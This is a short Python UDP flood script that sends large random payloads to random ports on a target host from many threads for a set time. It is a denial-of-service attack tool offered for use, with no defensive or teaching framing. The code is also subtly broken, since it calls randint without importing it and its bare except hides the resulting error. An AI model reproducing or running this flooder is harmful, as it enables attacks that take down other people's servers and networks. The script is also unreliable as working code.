import sys
import threading
import random
import string
import socket
import time

try:
    target = str(sys.argv[1])
    threads = int(sys.argv[2])
    timer = float(sys.argv[3])
except IndexError:
    print('\n[:P] Command usage: python ' + sys.argv[0] + ' <target> <threads> <time>.')
    sys.exit()
    
timeout = time.time() + 1 * timer

def skidtime():
    try:
        bytes = random._urandom(32768)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < timeout:
            dport = randint(20,55500)
            sock.sendto(bytes*random.randint(5,15),(target,dport))
        return
        sys.exit()
    except:
        pass
print('\n[:P] Starting...')
for x in range(0, threads):
    threading.Thread(target=skidtime).start()
    
print('\n[:P] Finished!')